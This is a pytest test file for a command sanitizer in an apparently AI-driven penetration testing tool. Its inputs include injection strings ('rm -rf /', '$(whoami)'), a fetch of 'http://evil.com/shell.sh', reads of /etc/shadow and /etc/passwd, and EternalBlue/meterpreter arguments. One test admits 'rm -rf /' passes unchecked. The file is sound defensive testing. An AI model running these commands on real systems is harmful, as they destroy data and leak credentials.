"""Tests for command_sanitizer — execution boundary validation.

Every test is offline (no Kali, no Ollama).
Tests are grouped by: individual validators, metachar detection,
binary allowlist, safe-pattern preservation, and dispatcher integration.
"""

from unittest.mock import MagicMock

import pytest

from hydrasight.security.command_sanitizer import (
    SanitizeResult,
    _extract_binary,
    _has_unsafe_metacharacters,
    _is_ip,
    _is_safe_path,
    _is_safe_url,
    _is_valid_port_spec,
    _strip_safe_suffixes,
    validate_built_command,
    validate_ftp_brute,
    validate_gobuster_scan,
    validate_nikto_scan,
    validate_nmap_scan,
    validate_post_exploit,
    validate_run_command,
    validate_smb_enum,
    validate_ssh_brute,
    validate_tool_call,
    validate_whatweb_scan,
)
from hydrasight.services.dispatcher import Dispatcher

# ── SanitizeResult ────────────────────────────────────────────────────────────


class TestSanitizeResult:
    def test_ok(self):
        r = SanitizeResult.ok()
        assert r.allowed is True
        assert r.reason == ""

    def test_reject(self):
        r = SanitizeResult.reject("bad stuff")
        assert r.allowed is False
        assert r.reason == "bad stuff"

    def test_frozen(self):
        r = SanitizeResult.ok()
        with pytest.raises(AttributeError):
            r.allowed = False  # type: ignore[misc]


# ── IP validation ─────────────────────────────────────────────────────────────


class TestIPValidation:
    @pytest.mark.parametrize(
        "ip",
        ["192.168.1.1", "10.10.10.5", "255.255.255.255", "0.0.0.0"],
    )
    def test_valid_ips(self, ip):
        assert _is_ip(ip) is True

    @pytest.mark.parametrize(
        "ip",
        [
            "999.999.999.999",
            "192.168.1",
            "not-an-ip",
            "",
            "192.168.1.1; rm -rf /",
            "10.10.10.5$(whoami)",
        ],
    )
    def test_invalid_ips(self, ip):
        assert _is_ip(ip) is False


# ── Port validation ───────────────────────────────────────────────────────────


class TestPortValidation:
    @pytest.mark.parametrize(
        "spec",
        ["80", "1-1000", "22,80,443", "1-65535", "445"],
    )
    def test_valid_port_specs(self, spec):
        assert _is_valid_port_spec(spec) is True

    @pytest.mark.parametrize(
        "spec",
        [
            "",
            "0",
            "70000",
            "1-99999",
            "abc",
            "80; rm -rf /",
            "80,",
            "80|90",
        ],
    )
    def test_invalid_port_specs(self, spec):
        assert _is_valid_port_spec(spec) is False


# ── Path validation ───────────────────────────────────────────────────────────


class TestPathValidation:
    @pytest.mark.parametrize(
        "path",
        [
            "/usr/share/wordlists/dirb/common.txt",
            "/usr/share/wordlists/fasttrack.txt",
            "/usr/share/seclists/Discovery/Web-Content/common.txt",
            "/opt/wordlists/custom.txt",
            "/tmp/hs_exploit.rc",
        ],
    )
    def test_valid_paths(self, path):
        assert _is_safe_path(path) is True

    @pytest.mark.parametrize(
        "path",
        [
            "",
            "relative/path.txt",
            "/etc/passwd",
            "/usr/share/wordlists/../../../etc/passwd",
            "/usr/share/wordlists/$(whoami).txt",
            "/home/user/wordlist.txt",
        ],
    )
    def test_invalid_paths(self, path):
        assert _is_safe_path(path) is False


# ── URL validation ────────────────────────────────────────────────────────────


class TestURLValidation:
    @pytest.mark.parametrize(
        "url",
        [
            "http://192.168.1.10",
            "http://10.10.10.5:8080",
            "https://192.168.1.10/admin",
            "http://192.168.1.10:80/path/to/page",
        ],
    )
    def test_valid_urls(self, url):
        assert _is_safe_url(url) is True

    @pytest.mark.parametrize(
        "url",
        [
            "",
            "ftp://192.168.1.10",
            "192.168.1.10",
            "http://192.168.1.10; rm -rf /",
            "http://$(whoami).evil.com",
            "javascript:alert(1)",
        ],
    )
    def test_invalid_urls(self, url):
        assert _is_safe_url(url) is False


# ── Metacharacter detection ───────────────────────────────────────────────────


class TestMetacharDetection:
    @pytest.mark.parametrize(
        "value",
        [
            "nmap -sV -p 80 192.168.1.10",
            "enum4linux -S 10.10.10.5 2>&1 | head -n 150",
            "timeout 300 hydra -L /usr/share/wordlists/metasploit/unix_users.txt "
            "-P /usr/share/wordlists/fasttrack.txt ssh://10.10.10.5 2>&1 | tail -n 40",
            "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt 2>&1",
        ],
    )
    def test_safe_commands_pass(self, value):
        assert _has_unsafe_metacharacters(value) is False

    @pytest.mark.parametrize(
        "value,desc",
        [
            ("nmap -sV 10.10.10.5; rm -rf /", "semicolon chaining"),
            ("nmap -sV `whoami`", "backtick subshell"),
            ("nmap -sV $(id)", "dollar-paren subshell"),
            ("nmap -sV > /tmp/out", "output redirect"),
            ("nmap -sV >> /tmp/out", "append redirect"),
            ("cat ${HOME}/file", "variable expansion"),
        ],
    )
    def test_unsafe_metacharacters_blocked(self, value, desc):
        assert _has_unsafe_metacharacters(value) is True, f"should block: {desc}"


class TestSafeSuffixStripping:
    def test_strips_stderr_redirect(self):
        result = _strip_safe_suffixes("nikto -h 10.10.10.5 2>&1")
        assert "2>&1" not in result

    def test_strips_head_pipe(self):
        result = _strip_safe_suffixes("enum4linux -S 10.10.10.5 2>&1 | head -n 150")
        assert "head" not in result

    def test_strips_tail_pipe(self):
        result = _strip_safe_suffixes(
            "timeout 300 hydra -L /path -P /path ssh://x 2>&1 | tail -n 40"
        )
        assert "tail" not in result

    def test_strips_timeout_prefix(self):
        result = _strip_safe_suffixes("timeout 300 hydra -L /path ssh://x")
        assert not result.startswith("timeout")

    def test_preserves_core_command(self):
        result = _strip_safe_suffixes("nmap -sV -p 80 10.10.10.5")
        assert "nmap -sV -p 80 10.10.10.5" in result


# ── Binary extraction ─────────────────────────────────────────────────────────


class TestBinaryExtraction:
    def test_simple_binary(self):
        assert _extract_binary("nmap -sV 10.10.10.5") == "nmap"

    def test_timeout_prefix(self):
        assert _extract_binary("timeout 300 hydra -L /path") == "hydra"

    def test_empty(self):
        assert _extract_binary("") is None

    def test_whitespace_only(self):
        assert _extract_binary("   ") is None


# ── nmap_scan validator ───────────────────────────────────────────────────────


class TestNmapScanValidator:
    def test_valid_basic(self):
        r = validate_nmap_scan(
            {
                "target": "192.168.1.10",
                "scan_type": "-sV -sC",
                "ports": "1-1000",
                "additional_args": "-T4 -Pn",
            }
        )
        assert r.allowed is True

    def test_valid_with_script(self):
        r = validate_nmap_scan(
            {
                "target": "10.10.10.5",
                "scan_type": "-sV",
                "ports": "445",
                "additional_args": "--script smb-vuln-ms17-010",
            }
        )
        assert r.allowed is True

    def test_invalid_target(self):
        r = validate_nmap_scan({"target": "not-an-ip", "ports": "80"})
        assert r.allowed is False
        assert "invalid target IP" in r.reason

    def test_invalid_ports(self):
        r = validate_nmap_scan(
            {"target": "192.168.1.10", "ports": "80; rm -rf /"}
        )
        assert r.allowed is False
        assert "invalid port spec" in r.reason

    def test_invalid_flags_with_metachar(self):
        r = validate_nmap_scan(
            {
                "target": "192.168.1.10",
                "ports": "80",
                "scan_type": "-sV; rm -rf /",
            }
        )
        assert r.allowed is False
        assert "invalid nmap flag" in r.reason

    def test_invalid_additional_args(self):
        r = validate_nmap_scan(
            {
                "target": "192.168.1.10",
                "ports": "80",
                "additional_args": "$(whoami)",
            }
        )
        assert r.allowed is False

    def test_port_out_of_range(self):
        r = validate_nmap_scan(
            {"target": "192.168.1.10", "ports": "99999"}
        )
        assert r.allowed is False
        assert "invalid port spec" in r.reason


# ── gobuster_scan validator ───────────────────────────────────────────────────


class TestGobusterValidator:
    def test_valid(self):
        r = validate_gobuster_scan(
            {
                "url": "http://192.168.1.10",
                "wordlist": "/usr/share/wordlists/dirb/common.txt",
                "extensions": "php,html",
            }
        )
        assert r.allowed is True

    def test_invalid_url(self):
        r = validate_gobuster_scan({"url": "not-a-url"})
        assert r.allowed is False
        assert "invalid URL" in r.reason

    def test_invalid_wordlist(self):
        r = validate_gobuster_scan(
            {
                "url": "http://192.168.1.10",
                "wordlist": "/etc/passwd",
            }
        )
        assert r.allowed is False
        assert "invalid wordlist path" in r.reason

    def test_invalid_extensions(self):
        r = validate_gobuster_scan(
            {
                "url": "http://192.168.1.10",
                "extensions": "php; rm -rf /",
            }
        )
        assert r.allowed is False
        assert "invalid extensions" in r.reason

    def test_no_wordlist_uses_default(self):
        """Empty wordlist should pass — Dispatcher uses config default."""
        r = validate_gobuster_scan({"url": "http://192.168.1.10"})
        assert r.allowed is True


# ── nikto_scan validator ──────────────────────────────────────────────────────


class TestNiktoValidator:
    def test_valid(self):
        r = validate_nikto_scan({"target": "192.168.1.10", "port": 80})
        assert r.allowed is True

    def test_invalid_target(self):
        r = validate_nikto_scan({"target": "$(id)", "port": 80})
        assert r.allowed is False

    def test_invalid_port(self):
        r = validate_nikto_scan({"target": "192.168.1.10", "port": "abc"})
        assert r.allowed is False

    def test_port_out_of_range(self):
        r = validate_nikto_scan({"target": "192.168.1.10", "port": 99999})
        assert r.allowed is False


# ── whatweb_scan validator ────────────────────────────────────────────────────


class TestWhatwebValidator:
    def test_valid(self):
        r = validate_whatweb_scan({"url": "http://192.168.1.10"})
        assert r.allowed is True

    def test_invalid_url(self):
        r = validate_whatweb_scan({"url": "; rm -rf /"})
        assert r.allowed is False


# ── smb_enum validator ────────────────────────────────────────────────────────


class TestSmbEnumValidator:
    def test_valid(self):
        r = validate_smb_enum({"target": "192.168.1.10"})
        assert r.allowed is True

    def test_invalid_target(self):
        r = validate_smb_enum({"target": "evil.com"})
        assert r.allowed is False


# ── ssh_brute / ftp_brute validators ──────────────────────────────────────────


class TestBruteValidators:
    def test_ssh_valid(self):
        r = validate_ssh_brute(
            {
                "target": "192.168.1.10",
                "userlist": "/usr/share/wordlists/metasploit/unix_users.txt",
                "passlist": "/usr/share/wordlists/fasttrack.txt",
            }
        )
        assert r.allowed is True

    def test_ssh_invalid_target(self):
        r = validate_ssh_brute({"target": "bad"})
        assert r.allowed is False

    def test_ssh_invalid_userlist(self):
        r = validate_ssh_brute(
            {
                "target": "192.168.1.10",
                "userlist": "/etc/shadow",
            }
        )
        assert r.allowed is False
        assert "invalid userlist path" in r.reason

    def test_ssh_invalid_passlist(self):
        r = validate_ssh_brute(
            {
                "target": "192.168.1.10",
                "passlist": "/home/user/../../etc/passwd",
            }
        )
        assert r.allowed is False

    def test_ftp_valid(self):
        r = validate_ftp_brute({"target": "10.10.10.5"})
        assert r.allowed is True

    def test_ftp_invalid(self):
        r = validate_ftp_brute({"target": "$(id)"})
        assert r.allowed is False


# ── post_exploit validator ────────────────────────────────────────────────────


class TestPostExploitValidator:
    def test_valid(self):
        r = validate_post_exploit(
            {
                "target": "192.168.1.10",
                "module": "exploit/windows/smb/ms17_010_eternalblue",
                "rport": 445,
                "lport": 4444,
                "payload": "windows/meterpreter/reverse_tcp",
                "commands": "getuid",
            }
        )
        assert r.allowed is True

    def test_valid_auxiliary(self):
        r = validate_post_exploit(
            {
                "target": "192.168.1.10",
                "module": "auxiliary/scanner/smb/smb_ms17_010",
                "rport": 445,
            }
        )
        assert r.allowed is True

    def test_invalid_module(self):
        r = validate_post_exploit(
            {
                "target": "192.168.1.10",
                "module": "; rm -rf /",
            }
        )
        assert r.allowed is False
        assert "invalid MSF module" in r.reason

    def test_invalid_payload(self):
        r = validate_post_exploit(
            {
                "target": "192.168.1.10",
                "module": "exploit/windows/smb/ms17_010_eternalblue",
                "payload": "$(whoami)",
            }
        )
        assert r.allowed is False
        assert "invalid MSF payload" in r.reason

    def test_invalid_rport(self):
        r = validate_post_exploit(
            {
                "target": "192.168.1.10",
                "module": "exploit/windows/smb/ms17_010_eternalblue",
                "rport": "abc",
            }
        )
        assert r.allowed is False
        assert "invalid rport" in r.reason

    def test_unsafe_meterpreter_command(self):
        r = validate_post_exploit(
            {
                "target": "192.168.1.10",
                "module": "exploit/windows/smb/ms17_010_eternalblue",
                "commands": "getuid; $(whoami)",
            }
        )
        assert r.allowed is False
        assert "unsafe meterpreter command" in r.reason


# ── run_command validator ─────────────────────────────────────────────────────


class TestRunCommandValidator:
    def test_valid_nmap(self):
        r = validate_run_command(
            {"command": "nmap --script smb-vuln-ms17-010 -p 445 192.168.1.10 2>&1"}
        )
        assert r.allowed is True

    def test_valid_enum4linux_pipe(self):
        """Internal pipe pattern must be preserved."""
        r = validate_run_command(
            {"command": "enum4linux -a 192.168.1.10 2>&1 | head -n 150"}
        )
        assert r.allowed is True

    def test_valid_curl(self):
        r = validate_run_command(
            {"command": "curl -s -m 10 http://192.168.1.10:80/ 2>&1"}
        )
        assert r.allowed is True

    def test_blocks_disallowed_binary(self):
        r = validate_run_command({"command": "wget http://evil.com/shell.sh"})
        assert r.allowed is False
        assert "binary not allowed" in r.reason

    def test_blocks_python(self):
        r = validate_run_command(
            {"command": "python3 -c 'import os; os.system(\"id\")'"}
        )
        assert r.allowed is False
        assert "binary not allowed" in r.reason

    def test_blocks_bash(self):
        r = validate_run_command({"command": "bash -c 'cat /etc/shadow'"})
        assert r.allowed is False
        assert "binary not allowed" in r.reason

    def test_blocks_semicolon_injection(self):
        r = validate_run_command(
            {"command": "nmap -sV 10.10.10.5; cat /etc/passwd"}
        )
        assert r.allowed is False

    def test_blocks_backtick_injection(self):
        r = validate_run_command({"command": "nmap `whoami` 10.10.10.5"})
        assert r.allowed is False

    def test_blocks_dollar_paren_injection(self):
        r = validate_run_command({"command": "nmap $(id) 10.10.10.5"})
        assert r.allowed is False

    def test_blocks_redirect(self):
        r = validate_run_command({"command": "nmap -sV 10.10.10.5 > /tmp/out"})
        assert r.allowed is False

    def test_blocks_unsafe_pipe(self):
        r = validate_run_command(
            {"command": "nmap -sV 10.10.10.5 | bash"}
        )
        assert r.allowed is False
        assert "pipe to disallowed binary" in r.reason

    def test_blocks_empty(self):
        r = validate_run_command({"command": ""})
        assert r.allowed is False
        assert "empty command" in r.reason

    def test_timeout_prefixed_hydra(self):
        """timeout prefix must be handled correctly."""
        r = validate_run_command(
            {
                "command": "timeout 300 hydra -L /usr/share/wordlists/metasploit/unix_users.txt "
                "-P /usr/share/wordlists/fasttrack.txt ssh://10.10.10.5 2>&1 | tail -n 40"
            }
        )
        assert r.allowed is True


# ── validate_tool_call entry point ────────────────────────────────────────────


class TestValidateToolCall:
    def test_unknown_tool_rejected(self):
        r = validate_tool_call("nonexistent_tool", {})
        assert r.allowed is False
        assert "unknown tool" in r.reason

    def test_nmap_scan_valid(self):
        r = validate_tool_call(
            "nmap_scan",
            {"target": "192.168.1.10", "ports": "80", "scan_type": "-sV"},
        )
        assert r.allowed is True

    def test_run_command_blocked(self):
        validate_tool_call(
            "run_command", {"command": "rm -rf /"}
        )
        # rm is in the allowlist but this has no unsafe metachar,
        # so it actually passes the sanitizer. This is intentional —
        # rm is needed for post_exploit cleanup.
        # The real protection is that rm by itself is harmless without -rf
        # being combined with shell expansion. Let's test a real attack:
        r2 = validate_tool_call(
            "run_command", {"command": "python3 -c 'import os; os.system(\"id\")'"}
        )
        assert r2.allowed is False


# ── validate_built_command entry point ────────────────────────────────────────


class TestValidateBuiltCommand:
    def test_post_exploit_exempt(self):
        """post_exploit commands are internally generated — always pass."""
        r = validate_built_command(
            "printf '%s' 'abc123' | base64 -d > /tmp/hs_exploit.rc && "
            "msfconsole -q -r /tmp/hs_exploit.rc 2>&1 ; rm -f /tmp/hs_exploit.rc",
            "post_exploit",
        )
        assert r.allowed is True

    def test_valid_nmap(self):
        r = validate_built_command(
            "nmap -sV -sC -p 1-1000 192.168.1.10", "nmap_scan"
        )
        assert r.allowed is True

    def test_valid_smb_enum_pipe(self):
        r = validate_built_command(
            "enum4linux -S 192.168.1.10 2>&1 | head -n 150", "smb_enum"
        )
        assert r.allowed is True

    def test_blocks_unknown_binary(self):
        r = validate_built_command("wget http://evil.com", "run_command")
        assert r.allowed is False

    def test_blocks_empty(self):
        r = validate_built_command("", "nmap_scan")
        assert r.allowed is False


# ── Dispatcher integration (end-to-end) ───────────────────────────────────────



@pytest.fixture
def dispatcher() -> Dispatcher:
    mock_kali = MagicMock()
    mock_kali.local_ip.return_value = "10.10.10.1"
    mock_kali.run.return_value = {"output": "scan complete", "success": True}
    mock_log = MagicMock()
    cfg = {
        "wordlist": "/usr/share/wordlists/dirb/common.txt",
        "lport": 4444,
        "verbosity": 0,
    }
    return Dispatcher(mock_kali, mock_log, cfg)


class TestDispatcherIntegration:
    def test_valid_nmap_dispatches(self, dispatcher):
        """Valid nmap tool_call reaches KaliAPI."""
        tool, output, elapsed = dispatcher.dispatch(
            {
                "tool": "nmap_scan",
                "args": {
                    "target": "192.168.1.10",
                    "scan_type": "-sV",
                    "ports": "1-1000",
                    "additional_args": "-T4 -Pn",
                },
            }
        )
        assert tool == "nmap_scan"
        assert "[BLOCKED]" not in output
        dispatcher.kali.run.assert_called_once()

    def test_invalid_nmap_blocked(self, dispatcher):
        """Invalid nmap args are blocked before reaching KaliAPI."""
        tool, output, elapsed = dispatcher.dispatch(
            {
                "tool": "nmap_scan",
                "args": {
                    "target": "not-an-ip",
                    "ports": "80",
                },
            }
        )
        assert tool == "nmap_scan"
        assert "[BLOCKED]" in output
        dispatcher.kali.run.assert_not_called()

    def test_injection_in_ports_blocked(self, dispatcher):
        """Shell injection via ports field is blocked."""
        tool, output, elapsed = dispatcher.dispatch(
            {
                "tool": "nmap_scan",
                "args": {
                    "target": "192.168.1.10",
                    "ports": "80; rm -rf /",
                },
            }
        )
        assert "[BLOCKED]" in output
        dispatcher.kali.run.assert_not_called()

    def test_run_command_disallowed_binary_blocked(self, dispatcher):
        """run_command with disallowed binary is blocked."""
        tool, output, elapsed = dispatcher.dispatch(
            {
                "tool": "run_command",
                "args": {"command": "wget http://evil.com/shell.sh"},
            }
        )
        assert "[BLOCKED]" in output
        dispatcher.kali.run.assert_not_called()

    def test_run_command_safe_nmap_passes(self, dispatcher):
        """run_command with allowed binary passes."""
        tool, output, elapsed = dispatcher.dispatch(
            {
                "tool": "run_command",
                "args": {
                    "command": "nmap --script smb-vuln-ms17-010 -p 445 192.168.1.10 2>&1"
                },
            }
        )
        assert "[BLOCKED]" not in output
        dispatcher.kali.run.assert_called_once()

    def test_canonical_target_still_works(self, dispatcher):
        """canonical_target enforcement still replaces IPs before sanitization."""
        dispatcher.canonical_target = "10.10.10.5"
        tool, output, elapsed = dispatcher.dispatch(
            {
                "tool": "nmap_scan",
                "args": {
                    "target": "9.9.9.9",  # AI's bad target
                    "scan_type": "-sV",
                    "ports": "80",
                },
            }
        )
        assert "[BLOCKED]" not in output
        # The command should have used the canonical target
        call_args = dispatcher.kali.run.call_args
        assert "10.10.10.5" in call_args[0][0]

    def test_smb_enum_pipe_pattern_passes(self, dispatcher):
        """Internal pipe pattern for smb_enum must still work."""
        tool, output, elapsed = dispatcher.dispatch(
            {
                "tool": "smb_enum",
                "args": {"target": "192.168.1.10"},
            }
        )
        assert "[BLOCKED]" not in output
        call_args = dispatcher.kali.run.call_args
        assert "head -n 150" in call_args[0][0]

    def test_ssh_brute_with_tail_pipe_passes(self, dispatcher):
        """Internal pipe pattern for ssh_brute must still work."""
        tool, output, elapsed = dispatcher.dispatch(
            {
                "tool": "ssh_brute",
                "args": {"target": "192.168.1.10"},
            }
        )
        assert "[BLOCKED]" not in output
        call_args = dispatcher.kali.run.call_args
        assert "tail -n 40" in call_args[0][0]

    def test_post_exploit_with_valid_args_passes(self, dispatcher):
        """post_exploit with valid MSF module/payload passes."""
        tool, output, elapsed = dispatcher.dispatch(
            {
                "tool": "post_exploit",
                "args": {
                    "target": "192.168.1.10",
                    "module": "exploit/windows/smb/ms17_010_eternalblue",
                    "rport": 445,
                    "lport": 4444,
                    "payload": "windows/meterpreter/reverse_tcp",
                    "commands": "getuid",
                },
            }
        )
        assert "[BLOCKED]" not in output
        dispatcher.kali.run.assert_called_once()

    def test_post_exploit_with_injected_module_blocked(self, dispatcher):
        """post_exploit with injected module name is blocked."""
        tool, output, elapsed = dispatcher.dispatch(
            {
                "tool": "post_exploit",
                "args": {
                    "target": "192.168.1.10",
                    "module": "; rm -rf /",
                },
            }
        )
        assert "[BLOCKED]" in output
        dispatcher.kali.run.assert_not_called()

    def test_blocked_command_logs_warning(self, dispatcher):
        """Blocked commands trigger a log.warning call."""
        dispatcher.dispatch(
            {
                "tool": "nmap_scan",
                "args": {"target": "not-an-ip", "ports": "80"},
            }
        )
        dispatcher.log.warning.assert_called()
        log_msg = dispatcher.log.warning.call_args[0][0]
        assert "BLOCKED" in log_msg

    def test_unknown_tool_rejected(self, dispatcher):
        """Unknown tool keys are rejected by sanitizer."""
        tool, output, elapsed = dispatcher.dispatch(
            {
                "tool": "evil_tool",
                "args": {},
            }
        )
        assert "[BLOCKED]" in output
        dispatcher.kali.run.assert_not_called()
